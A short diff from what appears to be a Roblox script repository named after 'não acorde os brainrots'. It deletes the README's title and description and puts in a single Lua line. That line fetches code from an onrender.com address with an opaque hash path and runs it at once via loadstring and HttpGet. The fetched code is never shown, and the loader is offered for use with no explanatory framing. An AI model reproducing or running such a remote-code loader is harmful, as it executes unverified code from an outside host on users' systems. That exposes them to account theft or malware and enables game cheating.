@@ -1,2 +1,1 @@
-# N-o-acorde-os-brainrots
-Script não acorde os brainrots
+loadstring(game:HttpGet("http://sunny-5n92.onrender.com/raw/5c2d4d2548cad6670be433ccaf27b58ff895d137121c5a55bdfc88cfc46650061d79f51a68e28f098ab89dedf55e73aab5adba9c94d9346f0e773c0f49f5d5aa"))()
